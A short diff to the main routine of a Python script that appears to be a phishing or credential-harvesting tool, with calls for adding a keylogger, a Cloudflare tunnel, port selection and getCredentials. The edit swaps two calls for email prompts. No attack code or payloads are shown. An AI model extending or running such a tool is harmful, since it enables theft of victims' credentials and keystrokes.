@@ -35,7 +35,7 @@ if __name__ == "__main__":
         keyloggerprompt()
         addingkeylogger()
         cloudfarePrompt()
-        addingCloudfare()
+        emailPrompt()
         inputCustom()
         port = selectPort()
 
@@ -47,5 +47,5 @@ if __name__ == "__main__":
         getCredentials(port)
 
     except KeyboardInterrupt:
-        endMessage()
+        emailPrompt3()
         exit(0)
